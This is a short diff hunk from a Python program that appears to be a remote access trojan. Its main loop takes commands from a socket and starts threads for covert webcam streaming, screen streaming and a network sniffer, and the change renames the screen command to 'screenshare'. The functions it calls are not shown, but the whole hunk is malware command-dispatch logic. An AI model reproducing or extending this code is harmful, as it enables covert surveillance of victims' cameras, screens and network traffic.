@@ -314,7 +314,7 @@ def main():
             command = client_socket.recv(1024).decode('utf-8')
             if command == "webcam_stream":
                 threading.Thread(target=webcam_stream, args=(client_socket,), daemon=True).start()
-            elif command == "screen_stream":
+            elif command == "screenshare":
                 threading.Thread(target=screen_stream, args=(client_socket,), daemon=True).start()
             elif command == "sniffer_start":
                 threading.Thread(target=sniffer_start, daemon=True).start()
